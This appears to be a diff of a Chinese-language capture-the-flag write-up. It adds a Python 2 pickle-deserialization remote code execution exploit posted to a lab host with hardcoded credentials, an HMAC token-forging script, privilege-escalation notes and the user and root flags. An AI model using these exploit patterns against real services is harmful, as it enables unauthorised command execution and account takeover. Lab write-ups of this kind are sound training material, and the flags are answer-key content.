@@ -209,13 +209,84 @@ print("[+] Server response:", trigger_response.text)
 >
 
 
+>好吧不行我去找大佬脚本利用了，gtp构造失败我也不想写
+>
+
+```
+#coding:utf-8
+import os
+import cPickle
+import hashlib
+import requests
+
+
+class CommandExecute(object):
+        def __reduce__(self):
+                return (os.system, ('ping -c 1 192.168.137.190',))
+
+convert_data = cPickle.dumps(CommandExecute())
+convert_crypt = hashlib.md5(convert_data).hexdigest()
+send_requests = requests.post('http://192.168.137.191:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))
+check_requests = requests.post('http://192.168.137.191:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))
+print(check_requests.text)
+```
+
+>这个是python2不是python3
+>
+
+![picture 10](../assets/images/5185fe07f80402a2415da872650fe94c7f651e0000bd821e72edf0d06b571f8b.png)  
+![picture 11](../assets/images/624f22b79c52838d8c8d98ad12aa2bdb9a7b732cae121ecc0ff3cf830ed03787.png)  
+
+>我直接执行busybox
+>
 
 
 ## 提权
 
+![picture 12](../assets/images/4929f443cc1f1dd2adb4ea0e5e71d7816ddbc7b202ff60098c02268f965384b6.png)  
+![picture 13](../assets/images/abf7a40664b371d392a63618a65f6730a43bed6bb437c041080297f2990e82a0.png)  
 
-
->userflag:
+>我直接工具,找了半天没找到提权我看看wp了
 >
->rootflag:
+
+![picture 14](../assets/images/449c2862ef7a15df9f27d3f640474351e1fa22b21137e9f44969705021b0e2be.png)  
+![picture 15](../assets/images/3e56bcad33d74012de9c45e617aeb07a6e49fea838eb2a6006ba6dcc96b50996.png)  
+
+>脚本
+>
+
+```
+import hashlib
+import socket
+import base64
+import hmac
+
+user=['lucas', 'mark']
+for i in user:
+    key = "dpff43f3p214k31301"
+    raw = i + key + socket.gethostbyname(socket.gethostname())
+    hashed = hmac.new(key, raw, hashlib.sha1)
+    print("[+] USER:",i)
+    print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n")))
+```
+
+![picture 16](../assets/images/7a7f5ba362f3a17c68134addb6dbae2ca3f9aeea7ab02c50448c192c8db6ea6b.png)  
+![picture 17](../assets/images/6a9777f57d726a5fd3ee197ba876a6385f0bbf7fde558089f777fc41cce35f81.png)  
+
+>失败了算了，我直接找内核方法了
+>
+
+![picture 18](../assets/images/e6ae9d3efe2b92a0b77ff683e0a2a0de3ad237a9aa851d5c2a1e896aa3e7d02d.png)  
+![picture 19](../assets/images/2af569d7cd0b9d1e889e58a4626a2d1003cbec83d101f314cfe013f6d9c343f9.png)  
+![picture 20](../assets/images/e013e9ce5458309e8753d2f0f10fa87b44d5cd2cb2b466a25884dd49fc24b2b3.png)  
+
+![picture 21](../assets/images/21ae49f3a6461985c8b6e4415adb34462edd9ccbc4501833d9038af20459c965.png)  
+
+>我不想在重新安装靶机去弄了已经改不回去了选择这个方式结束，等无聊再弄一下，搁置常规方法
+>
+
+
+>userflag:e25fd1b9248d1786551e3412adc74f6f
+>
+>rootflag:7a32c9739cc63ed983ae01af2577c01c
 >
